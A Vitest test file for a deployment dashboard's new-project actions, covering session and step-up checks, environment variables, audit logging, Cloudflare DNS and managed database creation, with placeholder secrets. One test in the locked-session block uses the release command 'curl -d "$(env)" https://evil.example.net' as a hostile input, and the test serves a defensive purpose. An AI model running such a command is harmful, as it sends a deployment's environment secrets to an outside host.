import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import type { AppConfig, ConfigDocument, EnvChange, ManagedDatabaseRequest, ManagedDatabaseResult, SaveOptions, SaveResult } from "@/lib/agent-types";
import { AgentError } from "@/lib/agent";
import type { ReviewInput } from "@/lib/repo-detect-core";
import type * as GithubModule from "@/lib/github";
import type * as GithubAppModule from "@/lib/github-app";
import { isStepUpError } from "@/lib/gate-core";
import { resetStepUp, state } from "./fake-step-up";

const dir = mkdtempSync(path.join(tmpdir(), "keelson-add-app-"));
process.env.KEELSON_DASHBOARD_DATA_DIR = dir;

const sessions: string[] = [];
let anonymous = false;
vi.mock("@/lib/session", () => ({
  requireSession: async () => {
    sessions.push("checked");
    if (anonymous) throw new Error("NO_SESSION");
  },
  clientInfo: async () => ({ ip: "127.0.0.1" }),
}));
vi.mock("next/cache", () => ({ revalidatePath: () => {} }));
vi.mock("@/lib/step-up", async () => (await import("./fake-step-up")).fakeStepUp);
vi.mock("next/navigation", () => ({
  redirect: (url: string) => {
    throw Object.assign(new Error("NEXT_REDIRECT"), { redirectTo: url });
  },
}));

const SHA = "a".repeat(40);
const BACKUP_KEY = "AGE-SECRET-KEY-1TESTONLYNOTAREALKEY0000000000000000000000000000000000";
const DB_RESULT: ManagedDatabaseResult = {
  database: { name: "shop", app: "shop", database: "shop", user: "shop", host: "keelson-postgres", port: 5432, mode: "network" },
  env_key: "DATABASE_URL",
  created: true,
  redeploy_required: true,
  backup_key: BACKUP_KEY,
  backup_recipient: "age1publichalf",
};
const MANUAL = { create: false, proxied: true };
// The server's host name resolves to a public address: no real DNS in a test.
vi.mock("@/lib/domain-probe", async (importActual) => ({ ...(await importActual<typeof import("@/lib/domain-probe")>()), resolveAll: async () => ["203.0.113.7"] }));
const agent = {
  doc: null as ConfigDocument | null,
  saved: [] as { name: string; app: AppConfig; opts: SaveOptions }[],
  saveResult: { ok: true, hash: "h2", issues: [] } as SaveResult,
  /** The variables API: whether the agent has it, what it was sent, what it answers. */
  envSupported: true,
  envCalls: [] as { app: string; change: EnvChange }[],
  envResult: { ok: true, changed: [] as string[], removed: [] as string[] } as { ok: true; changed: string[]; removed: string[] } | { ok: false; message: string; issues: { key: string; message: string }[] },
  order: [] as string[],
  /** The managed PostgreSQL API: what a create answers (or throws), and what it was asked. */
  database: { result: undefined as ManagedDatabaseResult | Error | undefined, calls: [] as ManagedDatabaseRequest[] },
};
vi.mock("@/lib/agent", async (importActual) => ({
  ...(await importActual<typeof import("@/lib/agent")>()),
  agentFor: () => ({
    config: async () => agent.doc,
    saveApp: async (name: string, app: AppConfig, opts: SaveOptions) => {
      agent.order.push("config");
      agent.saved.push({ name, app, opts });
      return agent.saveResult;
    },
    supportsEnv: async () => agent.envSupported,
    setEnv: async (app: string, change: EnvChange) => {
      agent.order.push("env");
      agent.envCalls.push({ app, change });
      return agent.envResult.ok ? { ok: true, changed: Object.keys(change.set ?? {}), removed: [] } : agent.envResult;
    },
    createDatabase: async (req: ManagedDatabaseRequest) => {
      agent.order.push("database");
      agent.database.calls.push(req);
      if (agent.database.result instanceof Error) throw agent.database.result;
      return agent.database.result ?? DB_RESULT;
    },
  }),
}));

const build = { result: { ok: true, deploymentId: "dep-9" } as { ok: true; deploymentId: string } | { ok: false; error: string }, calls: [] as unknown[] };
vi.mock("@/lib/github-webhook", () => ({
  startBuild: async (link: unknown, run: unknown) => {
    agent.order.push("build");
    build.calls.push([link, run]);
    return build.result;
  },
}));
const branches = { list: [] as string[] | Error };
vi.mock("@/lib/github-app", async (importActual) => ({ ...(await importActual<typeof GithubAppModule>()), installationToken: async () => "installation-token" }));
vi.mock("@/lib/github", async (importActual) => ({
  ...(await importActual<typeof GithubModule>()),
  githubBranches: async () => {
    if (branches.list instanceof Error) throw branches.list;
    return branches.list;
  },
}));
const NO_SUGGESTION = { framework: null, release: null, database: null, envNames: [] as string[] };
const head = { error: null as string | null, detect: null as { error: string } | { candidates: unknown[]; truncated: boolean; suggestion?: unknown } | null };
vi.mock("@/lib/github-detect", async (importActual) => {
  const actual = await importActual<typeof import("@/lib/github-detect")>();
  return {
    ...actual,
    detectRepo: async (repo: string) => {
      if (head.detect && "error" in head.detect) throw new actual.RepoReadError(head.detect.error, 404);
      return { repo, defaultBranch: "main", sha: SHA, private: false, suggestion: NO_SUGGESTION, ...(head.detect ?? { candidates: [], truncated: false }) };
    },
    branchHead: async () => {
      if (head.error) throw new actual.RepoReadError(head.error, 404);
      return SHA;
    },
  };
});

import { FakeCloudflare } from "./fake-cloudflare";

const { db } = await import("@/lib/db");
const actions = await import("@/app/new-project-actions");
const integrations = await import("@/lib/integrations");
const servers = await import("@/lib/servers");
const store = await import("@/lib/auth/store");

let staging = "";
let readOnly = "";
beforeAll(() => {
  staging = servers.createServer({ name: "staging", url: "https://stg.example.com", token: "t".repeat(40), deploySecret: "s".repeat(40) });
  readOnly = servers.createServer({ name: "ro", url: "https://ro.example.com", token: "t".repeat(40) });
});
afterAll(() => rmSync(dir, { recursive: true, force: true }));
beforeEach(() => {
  resetStepUp();
  for (const table of ["app_repos", "audit_log", "integrations"]) db().exec(`DELETE FROM ${table}`);
  integrations.saveGithubApp({ appId: "4242", slug: "my-keelson", privateKey: "PRIVATE-KEY-MATERIAL" });
  sessions.length = 0;
  anonymous = false;
  agent.saved = [];
  agent.saveResult = { ok: true, hash: "h2", issues: [] };
  agent.envSupported = true;
  agent.envCalls = [];
  agent.envResult = { ok: true, changed: [], removed: [] };
  agent.order = [];
  agent.database = { result: undefined, calls: [] };
  head.detect = null;
  agent.doc = { content: "", hash: "h1", modified_at: "", applied_hash: "h1", deprecations: [], model: { proxy: {}, apps: [{ name: "web", image: "x", publish: ["127.0.0.1:8100:80"] }] } };
  build.result = { ok: true, deploymentId: "dep-9" };
  build.calls = [];
  head.error = null;
});

const input = (extra: Partial<ReviewInput> = {}): ReviewInput => ({
  name: "shop",
  branch: "main",
  preset: "dockerfile",
  options: {},
  release: "",
  dockerfile: "Dockerfile",
  context: ".",
  port: "3000",
  exposure: "domain",
  domain: "shop.example.com",
  hostPort: "8101",
  healthPath: "",
  memory: "2g",
  cpus: "2",
  timeout: "15m",
  buildHostNetwork: false,
  buildDatabase: false,
  envFile: "",
  buildOnPush: true,
  previews: false,
  ...extra,
});

async function redirected(promise: Promise<unknown>): Promise<string | null> {
  try {
    await promise;
    return null;
  } catch (err) {
    if (err instanceof Error && err.message === "NEXT_REDIRECT") return (err as Error & { redirectTo: string }).redirectTo;
    throw err;
  }
}

describe("createProjectAction", () => {
  it("checks the session, writes the app, links it, audits it, starts the first build and goes to the deployment", async () => {
    const to = await redirected(actions.createProjectAction(staging, "Acme/Shop", input(), MANUAL));
    expect(to).toBe(`/servers/${staging}/deployments/dep-9`);
    expect(sessions).toEqual(["checked"]);
    expect(agent.saved).toHaveLength(1);
    expect(agent.saved[0]!.app).toMatchObject({ name: "shop", image: "keelson-local/shop" });
    expect(integrations.getAppRepo(staging, "shop")).toMatchObject({ repo: "Acme/Shop", branch: "main", buildOnPush: true, buildPreviews: false });
    expect(build.calls).toEqual([[{ serverId: staging, app: "shop" }, { repo: "Acme/Shop", branch: "main", sha: SHA }]]);
    const events = store.recentAudit(20).map((e) => e.event).reverse();
    expect(events).toEqual(["app_created_from_repo", "repo_linked", "build_modes", "first_build_started"]);
  });

  it("keeps no secret in the audit log or in the outcome", async () => {
    build.result = { ok: false, error: "the agent cannot build this app: bad Dockerfile" };
    const out = await actions.createProjectAction(staging, "acme/shop", input({ envFile: "/etc/keelson/shop.env" }), MANUAL);
    const text = JSON.stringify([out, store.recentAudit(20)]);
    expect(text).not.toContain("PRIVATE-KEY-MATERIAL");
    expect(text).not.toContain("s".repeat(40));
    expect(text).not.toContain("t".repeat(40));
  });

  it("returns what is done and what is not when the build fails, keeping the config and the link, and the retry then builds only", async () => {
    build.result = { ok: false, error: "a deployment is already running" };
    const out = await actions.createProjectAction(staging, "acme/shop", input(), MANUAL);
    expect(out.steps.config.state).toBe("done");
    expect(out.steps.link.state).toBe("done");
    expect(out.steps.build).toEqual({ state: "failed", detail: "a deployment is already running" });
    expect(out.retry).toBe("build");
    expect(integrations.getAppRepo(staging, "shop")).not.toBeNull();

    // The agent now has the app: the retry reads it, writes nothing.
    agent.doc = { ...agent.doc!, model: { ...agent.doc!.model, apps: [...(agent.doc!.model.apps ?? []), { name: "shop", image: "keelson-local/shop", port: 3000, domains: ["shop.example.com"] }] } };
    build.result = { ok: true, deploymentId: "dep-10" };
    const to = await redirected(actions.retryCreateProjectAction(staging, "acme/shop", input(), "build", MANUAL));
    expect(to).toBe(`/servers/${staging}/deployments/dep-10`);
    expect(agent.saved).toHaveLength(1);
  });

  it("shows the agent's validation issues verbatim and links and builds nothing", async () => {
    agent.saveResult = { ok: false, kind: "invalid", message: "invalid configuration", issues: [{ severity: "error", path: "apps[shop].domains", message: "domain \"shop.example.com\" is not a valid hostname" }] };
    const out = await actions.createProjectAction(staging, "acme/shop", input(), MANUAL);
    expect(out.issues).toEqual([{ severity: "error", path: "apps[shop].domains", message: 'domain "shop.example.com" is not a valid hostname' }]);
    expect(integrations.getAppRepo(staging, "shop")).toBeNull();
    expect(build.calls).toEqual([]);
  });

  it("refuses a name that exists, and a repository that cannot be read, before writing", async () => {
    const taken = await actions.createProjectAction(staging, "acme/shop", input({ name: "web" }), MANUAL);
    expect(taken.fieldErrors?.name).toBeDefined();
    head.error = "GitHub has no such file, branch or repository, or the GitHub App cannot see it.";
    const hidden = await actions.createProjectAction(staging, "acme/shop", input(), MANUAL);
    expect(hidden.steps.config.detail).toMatch(/Nothing was written.*cannot see it/);
    expect(agent.saved).toEqual([]);
  });

  it("refuses with no GitHub App, with no deploy secret, for an unknown server and for a bad repository, writing nothing", async () => {
    integrations.removeGithubApp();
    expect((await actions.createProjectAction(staging, "acme/shop", input(), MANUAL)).steps.config.detail).toMatch(/GitHub App is not set up/);
    integrations.saveGithubApp({ appId: "4242", slug: null, privateKey: "k" });
    expect((await actions.createProjectAction(readOnly, "acme/shop", input(), MANUAL)).steps.config.detail).toMatch(/read-only here/);
    expect((await actions.createProjectAction("nope", "acme/shop", input(), MANUAL)).steps.config.detail).toMatch(/Unknown server/);
    expect((await actions.createProjectAction(staging, "not a repo", input(), MANUAL)).steps.config.detail).toMatch(/not a GitHub repository/);
    expect(agent.saved).toEqual([]);
    expect(build.calls).toEqual([]);
  });

  it("refuses a server that does not serve traffic: no project is written to it", async () => {
    const mac = servers.createRelayServer({ name: "marc-mac", token: "t".repeat(40), deploySecret: "s".repeat(40), credentialHash: "h", serves: false }).id;
    expect((await actions.createProjectAction(mac, "acme/shop", input(), MANUAL)).steps.config.detail).toMatch(/does not serve traffic/);
    expect(agent.saved).toEqual([]);
    expect(build.calls).toEqual([]);
  });

  it("does nothing without a session: nothing is written, linked or built", async () => {
    anonymous = true;
    await expect(actions.createProjectAction(staging, "acme/shop", input(), MANUAL)).rejects.toThrow("NO_SESSION");
    await expect(actions.retryCreateProjectAction(staging, "acme/shop", input(), "build", MANUAL)).rejects.toThrow("NO_SESSION");
    expect(agent.saved).toEqual([]);
    expect(build.calls).toEqual([]);
    expect(integrations.getAppRepo(staging, "shop")).toBeNull();
  });

  describe("when the session is not unlocked", () => {
    beforeEach(() => {
      state.locked = true;
    });

    it("refuses to create: nothing is written, linked, set or built, and the outcome carries the unlock message", async () => {
      const out = await actions.createProjectAction(staging, "acme/shop", input({ envFile: "/etc/keelson/other.env", release: "curl -d \"$(env)\" https://evil.example.net" }), MANUAL, VARS);
      expect(out.steps.config.state).toBe("failed");
      expect(isStepUpError(out.steps.config.detail)).toBe(true);
      expect(agent.saved).toEqual([]);
      expect(agent.envCalls).toEqual([]);
      expect(build.calls).toEqual([]);
      expect(integrations.getAppRepo(staging, "shop")).toBeNull();
      expect(state.asked.map((a) => a.verdict.required)).toEqual([true]);
      expect(JSON.stringify(out)).not.toContain(PW);
    });

    it("refuses the retry too, whichever step it would run: it sets variables and points a host name the browser chose", async () => {
      for (const from of ["database", "env", "link", "dns", "build"] as const) {
        const out = await actions.retryCreateProjectAction(staging, "acme/shop", input(), from, { create: true, proxied: true }, VARS);
        expect(isStepUpError(out.steps.config.detail), from).toBe(true);
        expect(out.retry, from).toBeUndefined();
      }
      expect(agent.envCalls).toEqual([]);
      expect(build.calls).toEqual([]);
      expect(integrations.getAppRepo(staging, "shop")).toBeNull();
    });

    it("creates the project once unlocked", async () => {
      state.locked = false;
      expect(await redirected(actions.createProjectAction(staging, "acme/shop", input(), MANUAL))).toBe(`/servers/${staging}/deployments/dep-9`);
    });
  });
});

const PW = "hunter2-zzz-very-secret";
const PUB = "https://public.example.org/xyz-123";
const VARS = [
  { key: "DATABASE_URL", value: PW, build: false },
  { key: "NEXT_PUBLIC_URL", value: PUB, build: true },
];

/** Every table of the dashboard's database, as text: where a value must never be. */
function wholeDatabase(): string {
  const tables = db().prepare("SELECT name FROM sqlite_master WHERE type = 'table'").all() as { name: string }[];
  return JSON.stringify(tables.map((t) => db().prepare(`SELECT * FROM "${t.name}"`).all()));
}

describe("the variables of a new project", () => {
  it("sets them on the agent after the app is written and before the first build, as the agent's own change (values and the build list)", async () => {
    const to = await redirected(actions.createProjectAction(staging, "acme/shop", input(), MANUAL, VARS));
    expect(to).toBe(`/servers/${staging}/deployments/dep-9`);
    expect(agent.order).toEqual(["config", "env", "build"]);
    expect(agent.envCalls).toEqual([{ app: "shop", change: { scope: "app", set: { DATABASE_URL: PW, NEXT_PUBLIC_URL: PUB }, build: ["NEXT_PUBLIC_URL"] } }]);
  });

  it("audits the names and the build-time ones, never a value, and keeps every value out of the database and the outcome", async () => {
    const to = await redirected(actions.createProjectAction(staging, "acme/shop", input(), MANUAL, VARS));
    expect(to).not.toBeNull();
    const events = store.recentAudit(20).map((e) => [e.event, e.detail]).reverse();
    expect(events.map(([e]) => e)).toEqual(["app_created_from_repo", "env_set", "repo_linked", "build_modes", "first_build_started"]);
    expect(events.find(([e]) => e === "env_set")![1]).toBe("staging: shop (app): DATABASE_URL, NEXT_PUBLIC_URL (build: NEXT_PUBLIC_URL)");
    const text = wholeDatabase();
    expect(text).not.toContain(PW);
    expect(text).not.toContain(PUB);
    expect(text).toContain("DATABASE_URL"); // positive control: the names are there
    expect(JSON.stringify(agent.saved)).not.toContain(PW);
  });

  it("returns an outcome without any value, whether the agent accepts, refuses with the value in its message, or fails", async () => {
    agent.envResult = { ok: false, message: `refused ${PW}`, issues: [{ key: "DATABASE_URL", message: `bad ${PW} / ${PUB}` }] };
    const refused = await actions.createProjectAction(staging, "acme/shop", input(), MANUAL, VARS);
    expect(refused.steps.env.state).toBe("failed");
    expect(refused.retry).toBe("env");
    expect(JSON.stringify(refused)).not.toContain(PW);
    expect(JSON.stringify(refused)).not.toContain(PUB);
    expect(JSON.stringify(store.recentAudit(20))).not.toContain(PW);
    expect(store.recentAudit(20).map((e) => e.event)).toContain("env_set_failed");
    expect(build.calls).toEqual([]);
    expect(integrations.getAppRepo(staging, "shop")).toBeNull(); // not linked yet: the variables come first
  });

  it("retried from the variables step, takes them again from the client, and goes on to the link and the build", async () => {
    agent.envResult = { ok: false, message: "the agent is busy", issues: [] };
    await actions.createProjectAction(staging, "acme/shop", input(), MANUAL, VARS);
    agent.doc = { ...agent.doc!, model: { ...agent.doc!.model, apps: [...(agent.doc!.model.apps ?? []), { name: "shop", image: "keelson-local/shop", port: 3000, domains: ["shop.example.com"] }] } };
    agent.envResult = { ok: true, changed: [], removed: [] };
    agent.envCalls = [];
    const to = await redirected(actions.retryCreateProjectAction(staging, "acme/shop", input(), "env", MANUAL, VARS));
    expect(to).toBe(`/servers/${staging}/deployments/dep-9`);
    expect(agent.envCalls[0]!.change.set).toEqual({ DATABASE_URL: PW, NEXT_PUBLIC_URL: PUB });
    expect(agent.saved).toHaveLength(1);
    expect(integrations.getAppRepo(staging, "shop")).not.toBeNull();
  });

  it("on an agent that is too old, writes nothing when variables were sent, and creates the project when there are none", async () => {
    agent.envSupported = false;
    const refused = await actions.createProjectAction(staging, "acme/shop", input(), MANUAL, VARS);
    expect(refused.steps.config.detail).toMatch(/Nothing was written.*too old to manage variables/);
    expect(agent.saved).toEqual([]);
    expect(JSON.stringify(refused)).not.toContain(PW);
    const to = await redirected(actions.createProjectAction(staging, "acme/shop", input(), MANUAL, []));
    expect(to).toBe(`/servers/${staging}/deployments/dep-9`);
    expect(agent.envCalls).toEqual([]);
  });

  it("takes a malformed list as no variables, and refuses a reserved name before writing", async () => {
    const to = await redirected(actions.createProjectAction(staging, "acme/shop", input(), MANUAL, "oops" as never));
    expect(to).not.toBeNull();
    expect(agent.envCalls).toEqual([]);
    agent.saved = [];
    const out = await actions.createProjectAction(staging, "acme/shop", input({ name: "shop2", domain: "shop2.example.com" }), MANUAL, [{ key: "KEELSON_TOKEN", value: PW, build: false }]);
    expect(out.varIssues?.[0]?.key).toBe("KEELSON_TOKEN");
    expect(agent.saved).toEqual([]);
    expect(JSON.stringify(out)).not.toContain(PW);
  });

  it("does nothing without a session", async () => {
    anonymous = true;
    await expect(actions.createProjectAction(staging, "acme/shop", input(), MANUAL, VARS)).rejects.toThrow("NO_SESSION");
    expect(agent.envCalls).toEqual([]);
  });
});

describe("what is written for a framework and a release command", () => {
  it("writes the preset's build block and the release step through the agent's config API", async () => {
    await redirected(actions.createProjectAction(staging, "acme/shop", input({ preset: "node", port: "3000", release: "node migrate.js", options: { start: "node server.js" } }), MANUAL));
    expect(agent.saved[0]!.app).toMatchObject({
      build: { preset: "node", start: "node server.js", memory: "2g", cpus: 2, timeout: "15m" },
      release: { steps: [{ name: "release", container: { command: ["sh", "-c", "node migrate.js"] } }] },
    });
    expect(store.recentAudit(20).find((e) => e.event === "app_created_from_repo")?.detail).toContain("node preset, release command");
  });
});

describe("inspectRepoAction", () => {
  it("reads the repository when it is chosen, hands back its Dockerfiles and what it suggests, and needs a session", async () => {
    const suggestion = { framework: { id: "nextjs", reason: "package.json depends on next." }, release: { command: "npx prisma migrate deploy", reason: "prisma/migrations exists." }, database: { reason: "prisma/schema.prisma uses PostgreSQL." }, envNames: ["SESSION_SECRET"] };
    head.detect = { candidates: [{ path: "Dockerfile", context: ".", dockerfile: "Dockerfile", port: 3000, portFromVariable: false, healthcheck: false }], truncated: false, suggestion };
    expect(await actions.inspectRepoAction("acme/shop")).toEqual({ ok: true, candidates: head.detect.candidates, truncated: false, suggestion, branches: [] });
    branches.list = ["develop", "main"];
    expect(await actions.inspectRepoAction("acme/shop")).toMatchObject({ ok: true, branches: ["develop", "main"] });
    branches.list = new Error("GitHub did not answer");
    expect(await actions.inspectRepoAction("acme/shop")).toMatchObject({ ok: true, branches: [] }); // a branch menu is a convenience: the branch can be typed
    branches.list = [];
    head.detect = { error: "GitHub has no such file, branch or repository, or the GitHub App cannot see it." };
    expect(await actions.inspectRepoAction("acme/shop")).toEqual({ ok: false, error: "GitHub has no such file, branch or repository, or the GitHub App cannot see it." });
    expect((await actions.inspectRepoAction("not a repo")).ok).toBe(false);
    anonymous = true;
    await expect(actions.inspectRepoAction("acme/shop")).rejects.toThrow("NO_SESSION");
  });
});

describe("the DNS step against Cloudflare", () => {
  const cfInput = () => input();
  let cf: FakeCloudflare;
  beforeEach(() => {
    cf = new FakeCloudflare();
    cf.addZone("example.com");
    vi.stubGlobal("fetch", cf.fetch);
    integrations.saveCloudflare(cf.token, { tokenId: "tok-1", expiresOn: null });
  });

  it("creates the record at Cloudflare after the link and before the build, proxied, and reports each step", async () => {
    const to = await redirected(actions.createProjectAction(staging, "acme/shop", cfInput(), { create: true, proxied: true }));
    expect(to).toBe(`/servers/${staging}/deployments/dep-9`); // a success goes to the deployment
    expect(cf.records).toMatchObject([{ type: "A", name: "shop.example.com", content: "203.0.113.7", proxied: true, ttl: 1 }]);
    const events = store.recentAudit(20).map((e) => e.event).reverse();
    expect(events).toEqual(["app_created_from_repo", "repo_linked", "build_modes", "dns_record_created", "first_build_started"]);
    expect(store.recentAudit(20).find((e) => e.event === "dns_record_created")?.detail).toBe("staging: shop.example.com (zone example.com): A shop.example.com -> 203.0.113.7, proxied");
    expect(JSON.stringify(store.recentAudit(20))).not.toContain(cf.token);
  });

  it("creates a DNS-only record when the operator chose it", async () => {
    await redirected(actions.createProjectAction(staging, "acme/shop", cfInput(), { create: true, proxied: false }));
    expect(cf.records[0]).toMatchObject({ proxied: false });
  });

  it("does not talk to Cloudflare at all when the operator creates the record, and says exactly what to create", async () => {
    build.result = { ok: false, error: "stop here" };
    const out = await actions.createProjectAction(staging, "acme/shop", cfInput(), MANUAL);
    expect(cf.calls).toEqual([]);
    expect(out.steps.dns).toEqual({ state: "skipped", detail: "Not created by Keelson. Create A shop.example.com -> 203.0.113.7 at your DNS provider yourself." });
    expect(out.steps.link.state).toBe("done");
  });

  it("is skipped for a local port", async () => {
    build.result = { ok: false, error: "stop here" };
    const out = await actions.createProjectAction(staging, "acme/shop", input({ exposure: "local", hostPort: "8101", domain: "" }), { create: true, proxied: true });
    expect(cf.calls).toEqual([]);
    expect(out.steps.dns.state).toBe("skipped");
  });

  it("stops at an existing record, keeps the app written, builds nothing, and the retry with the confirmation goes on", async () => {
    cf.addRecord("example.com", { type: "A", name: "shop.example.com", content: "198.51.100.9" });
    const out = await actions.createProjectAction(staging, "acme/shop", cfInput(), { create: true, proxied: true });
    expect(out.steps.config.state).toBe("done");
    expect(out.steps.dns.state).toBe("failed");
    expect(out.steps.dns.detail).toContain("A 198.51.100.9");
    expect(out.steps.link.state).toBe("done");
    expect(out.dnsProblem).toMatchObject({ kind: "conflict", confirm: "A 198.51.100.9" });
    expect(out.retry).toBe("dns");
    expect(cf.writes).toEqual([]);
    expect(build.calls).toEqual([]);
    expect(integrations.getAppRepo(staging, "shop")).not.toBeNull(); // linked before the DNS step
    expect(agent.saved).toHaveLength(1);

    // The agent now has the app; the retry carries the confirmation and writes nothing to the agent.
    agent.doc = { ...agent.doc!, model: { ...agent.doc!.model, apps: [...(agent.doc!.model.apps ?? []), { name: "shop", image: "keelson-local/shop", port: 3000, domains: ["shop.example.com"] }] } };
    const unconfirmed = await actions.retryCreateProjectAction(staging, "acme/shop", cfInput(), "dns", { create: true, proxied: true });
    expect(unconfirmed.dnsProblem?.kind).toBe("conflict");
    const to = await redirected(actions.retryCreateProjectAction(staging, "acme/shop", cfInput(), "dns", { create: true, proxied: true, confirmReplace: "A 198.51.100.9" }));
    expect(to).toBe(`/servers/${staging}/deployments/dep-9`);
    expect(cf.recordsNamed("shop.example.com")).toMatchObject([{ content: "203.0.113.7", proxied: true }]);
    expect(agent.saved).toHaveLength(1);
    expect(integrations.getAppRepo(staging, "shop")).not.toBeNull();
  });

  it("asks for a decision on a private address of the server, and goes on when it is given", async () => {
    servers.updateServer(staging, { name: "staging", url: "https://stg.example.com", caCert: "", clientCert: "", publicIp: "10.1.2.3" });
    try {
      const out = await actions.createProjectAction(staging, "acme/shop", cfInput(), { create: true, proxied: true });
      expect(out.dnsProblem).toEqual({ kind: "private", ip: "10.1.2.3" });
      expect(cf.writes).toEqual([]);
      agent.doc = { ...agent.doc!, model: { ...agent.doc!.model, apps: [...(agent.doc!.model.apps ?? []), { name: "shop", image: "keelson-local/shop", port: 3000, domains: ["shop.example.com"] }] } };
      await redirected(actions.retryCreateProjectAction(staging, "acme/shop", cfInput(), "dns", { create: true, proxied: true, allowPrivate: true }));
      expect(cf.records[0]).toMatchObject({ content: "10.1.2.3" });
    } finally {
      servers.updateServer(staging, { name: "staging", url: "https://stg.example.com", caCert: "", clientCert: "", publicIp: "" });
    }
  });

  it("fails the step, not the request, when the token no longer works or lacks the permission, and never shows the token", async () => {
    cf.can.dnsEdit = false;
    const out = await actions.createProjectAction(staging, "acme/shop", cfInput(), { create: true, proxied: true });
    expect(out.steps.dns).toEqual({ state: "failed", detail: expect.stringContaining("Zone → DNS → Edit") });
    expect(out.retry).toBe("dns");
    expect(JSON.stringify([out, store.recentAudit(20)])).not.toContain(cf.token);
  });

  it("fails the step, with the way to connect, when Cloudflare is asked for and not connected", async () => {
    integrations.removeCloudflare();
    const out = await actions.createProjectAction(staging, "acme/shop", cfInput(), { create: true, proxied: true });
    expect(out.steps.dns).toEqual({ state: "failed", detail: expect.stringContaining("not connected") });
  });

  it("takes only what a client may decide: a string for the confirmation, nothing truthy for the booleans", async () => {
    cf.addRecord("example.com", { type: "A", name: "shop.example.com", content: "198.51.100.9" });
    const rogue = { create: "yes", proxied: true, confirmReplace: ["A 198.51.100.9"] } as unknown as { create: boolean; proxied: boolean };
    const to = await redirected(actions.createProjectAction(staging, "acme/shop", cfInput(), rogue));
    expect(to).not.toBeNull(); // the app went through...
    expect(cf.calls).toEqual([]); // ...and "yes" is not true: nothing was asked of Cloudflare, nothing replaced
    expect(cf.records[0]?.content).toBe("198.51.100.9");
  });
});

describe("a database asked for", () => {
  it("is created for the app once it is written, before the build, and the page is not redirected while the backup key is unsaved", async () => {
    const out = await actions.createProjectAction(staging, "acme/shop", input(), MANUAL, [], true);
    expect(agent.database.calls).toEqual([{ app: "shop" }]);
    expect(agent.order).toEqual(["config", "database", "build"]);
    expect(out.deploymentId).toBe("dep-9");
    expect(out.database).toEqual({ name: "shop", envKey: "DATABASE_URL", created: true, backupKey: BACKUP_KEY, backupRecipient: "age1publichalf" });
  });

  it("audits the creation by name, and keeps the backup key out of the audit log", async () => {
    await actions.createProjectAction(staging, "acme/shop", input(), MANUAL, [], true);
    const events = store.recentAudit(20).map((e) => e.event);
    expect(events).toContain("database_created");
    expect(JSON.stringify(store.recentAudit(20))).not.toContain(BACKUP_KEY);
  });

  it("redirects to the deployment as usual when the database existed and there is no key to save", async () => {
    agent.database.result = { ...DB_RESULT, created: false, backup_key: undefined, backup_recipient: undefined };
    const to = await redirected(actions.createProjectAction(staging, "acme/shop", input(), MANUAL, [], true));
    expect(to).toBe(`/servers/${staging}/deployments/dep-9`);
  });

  it("asks nothing of the agent unless the flag is exactly true", async () => {
    const to = await redirected(actions.createProjectAction(staging, "acme/shop", input(), MANUAL, [], "yes" as unknown as boolean));
    expect(to).not.toBeNull();
    expect(agent.database.calls).toEqual([]);
  });

  it("reports the agent's refusal as a failed step that can be retried, and starts no build", async () => {
    agent.database.result = new AgentError(502, "the managed PostgreSQL did not become healthy");
    const out = await actions.createProjectAction(staging, "acme/shop", input(), MANUAL, [], true);
    expect(out.steps.database).toEqual({ state: "failed", detail: "The database could not be created: the managed PostgreSQL did not become healthy" });
    expect(out.retry).toBe("database");
    expect(build.calls).toEqual([]);
    expect(agent.saved).toHaveLength(1); // the app stays written
  });

  it("does not navigate a retry away while the page still holds an unsaved key, and does once it does not", async () => {
    agent.doc = { ...agent.doc!, model: { ...agent.doc!.model, apps: [...(agent.doc!.model.apps ?? []), { name: "shop", image: "keelson-local/shop", port: 3000, domains: ["shop.example.com"] }] } };
    const held = await actions.retryCreateProjectAction(staging, "acme/shop", input(), "build", MANUAL, [], true, true);
    expect(held.deploymentId).toBe("dep-9");
    const to = await redirected(actions.retryCreateProjectAction(staging, "acme/shop", input(), "build", MANUAL, [], true, false));
    expect(to).toBe(`/servers/${staging}/deployments/dep-9`);
    expect(agent.database.calls).toEqual([]); // a retry of the build does not create the database again
  });
});
